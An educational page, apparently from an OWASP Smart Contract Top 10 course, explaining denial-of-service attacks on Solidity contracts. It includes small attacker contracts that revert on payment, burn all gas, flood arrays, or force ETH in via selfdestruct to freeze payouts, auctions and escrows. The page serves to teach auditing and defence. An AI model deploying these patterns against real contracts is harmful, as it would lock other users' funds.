# SC10: Denial of Service (DoS) Attacks - Attack Vectors

## Table of Contents

- [Understanding DoS Attack Vectors](#understanding)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining DoS Conditions](#chaining)

## Understanding DoS Attack Vectors

**&#9888; EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in contracts you own or are authorised to audit.

A smart-contract DoS is rarely a memory-corruption trick. It is an attack on **assumptions**: the developer assumed every recipient accepts ETH, that an array stays small, that an external contract will always answer, or that only the contract's own functions move its balance. The attacker's job is to **violate one of those assumptions** and wedge the shared mechanism.

The attacker's goal in this category is usually one of:

- Make a critical function **revert forever** so no one can use it.
- Make a function **too expensive to execute** within the block gas limit.
- **Lock funds** by breaking a dependency or capturing a single point of control.

### Core Attack Flow

```
1. Study
   &darr;
   Find a loop, a push payment, a refund-on-outbid, or a hard dependency
2. Position
   &darr;
   Become a recipient / bidder / participant the contract MUST interact with
3. Poison
   &darr;
   Reject ETH, consume all gas, inflate the array, or break the dependency
4. Freeze
   &darr;
   The critical path now reverts or runs out of gas for EVERYONE
```

## Common Attack Patterns

### 1. Poison Recipient in a Push-Payment Loop

The contract pays many recipients in one transaction. The attacker becomes a recipient whose `receive`/`fallback` always reverts, so the whole loop reverts.

```
// Vulnerable distributor
function distribute(uint amount) external {
    for (uint i = 0; i < recipients.length; i++) {
        recipients[i].transfer(amount);   // reverts whole tx if ONE fails
    }
}

// Attacker's poison contract — registered as a recipient
contract Poison {
    receive() external payable { revert("no"); }  // rejects every payment
}
```

**Payoff**: after the attacker is in the recipient set, `distribute` can never succeed again—no one gets paid. Cost to attacker: near zero.

### 2. Refund-on-Outbid Auction Freeze ("King of the Ether")

To become the new highest bidder, the contract first refunds the previous bidder. If that refund is pushed and the previous bidder rejects it, no one can outbid.

```
// Vulnerable auction
function bid() external payable {
    require(msg.value > highestBid, "too low");
    highestBidder.transfer(highestBid);   // refund PUSHED to previous bidder
    highestBidder = msg.sender;            // ...never reached if refund reverts
    highestBid = msg.value;
}
```

```
// Attacker bids from a contract that rejects refunds:
contract StuckKing {
    function attack(address auction) external payable {
        Auction(auction).bid{value: msg.value}();  // becomes highest bidder
    }
    receive() external payable { revert(); }        // blocks any future refund
}
```

**Payoff**: the attacker is frozen in as the permanent highest bidder; the auction can never accept a higher bid. The funds/logic are stuck.

### 3. Array Inflation to Exceed the Block Gas Limit

A function loops over an array the attacker can cheaply grow. Once the loop's gas cost passes the block limit, the function is permanently unexecutable.

```
// Vulnerable: anyone can enlarge the array cheaply
address[] public players;
function join() external payable { players.push(msg.sender); }

function payout() external {
    for (uint i = 0; i < players.length; i++) {   // O(n)
        payable(players[i]).transfer(prize / players.length);
    }
}
```

```
// Attacker floods entries from many addresses (or a loop of pushes)
// until payout() costs more gas than a block allows.
for (uint i = 0; i < 5000; i++) target.join{value: 0}();  // conceptual
```

**Payoff**: `payout()` now always reverts out-of-gas. The prize is locked and the game can never resolve.

### 4. Gas-Griefing via a Recipient That Burns All Gas

Even without reverting, a recipient can consume all forwarded gas so the caller's remaining execution fails.

```
// Vulnerable caller forwards all gas via call
(bool ok, ) = recipient.call{value: amount}("");
require(ok, "pay failed");

// Malicious recipient burns gas in an unbounded loop
contract GasBurner {
    receive() external payable {
        while (true) { }   // consumes all gas forwarded to it
    }
}
```

**Payoff**: the payment step exhausts the transaction's gas, so the surrounding logic (and any batch it was part of) fails. Forwarding a fixed, small gas stipend or using pull payments defeats this.

### 5. Breaking a Hard External Dependency

A function must call an external contract. If that contract is self-destructed or paused, every dependent function reverts.

```
// Vulnerable: no fallback if `logic` disappears
contract Proxy {
    address public logic;   // delegatecalls into a shared library
    fallback() external payable {
        (bool ok, ) = logic.delegatecall(msg.data);
        require(ok);
    }
}
// If `logic` is selfdestruct-ed, every call through Proxy reverts forever,
// freezing whatever funds the Proxy custodies.
```

**Payoff**: the dependent contract is bricked. This is the classic "shared library destroyed → wallets frozen" class of incident.

### 6. Capturing / Losing a Single Point of Control

Recovery is gated on one owner. If the owner is lost or is a broken contract, the escape hatch is uncallable.

```
// Vulnerable: single owner, no backup, no timelocked fallback
function emergencyWithdraw() external onlyOwner { payable(owner).transfer(address(this).balance); }
// If `owner` is an EOA whose key is lost, or a contract with no way to
// call this, the funds are locked with no recovery path.
```

**Payoff**: funds intended to be rescuable become permanently locked. A lost or hostile single owner is itself a DoS.

### 7. Forcing ETH In to Break a Balance Invariant

Logic that trusts `address(this).balance` can be wedged by force-sending ETH via `selfdestruct`.

```
// Vulnerable invariant
function finalize() external {
    require(address(this).balance == targetGoal, "not exactly at goal");
    // ...only runs if the balance is EXACTLY the expected value
}

// Attacker forces extra wei in so the balance never equals targetGoal:
contract Forcer { function push(address t) external payable { selfdestruct(payable(t)); } }
```

**Payoff**: `finalize()` can never satisfy its equality check again, stalling the crowdsale/escrow. Use internal accounting, and `>=` not `==`, instead of trusting the raw balance.

### 8. Pinning a Shared State Variable

Progress for all users depends on a variable that one participant can hold in a hostile state.

```
// Vulnerable: everyone waits on `currentLeader` to be displaceable,
// but displacing it requires a successful push to the current leader.
// A poison leader that rejects the push pins the variable permanently.
address public currentLeader;
```

**Payoff**: the mechanism stalls because the state variable can never advance. Same root cause as the auction freeze, generalised to any "must update the incumbent" design.

## Chaining DoS Conditions

Individually minor design choices combine into a permanent freeze:

```
Push payments in a loop        -> attacker becomes a poison recipient
        +
No pull-based fallback         -> there is no alternate way to be paid
        =  the payout function reverts forever for everyone
```

Another common chain:

```
Unbounded array of participants -> attacker floods dust entries
        -> batch payout exceeds the block gas limit
        -> single owner meant to "rescue" funds has lost the key
        =  prize permanently locked, no recovery path
```

## Key Takeaways

1. **DoS attacks target assumptions**—"every recipient accepts ETH", "the array stays small", "the dependency is always there".
2. **Becoming a poison participant is cheap**—one reverting `receive()` can freeze a whole payout loop.
3. **Unbounded loops are attacker-controllable**—flooding entries turns a working function into a permanent out-of-gas revert.
4. **Hard dependencies and single owners are freeze risks**—a destroyed library or a lost key locks funds with no path out.
5. **Never trust address(this).balance**—forced ETH lets an attacker break equality-based invariants.

## Next Steps

- **Prevention Guide**: Pull payments, bounded loops, and robust ownership
- **Code Examples**: See vulnerable vs. secure Solidity
- **Smart Contract Learning Path**: Continue the OWASP Smart Contract Top 10
- **Practice**: Apply what you've learned in hands-on challenges
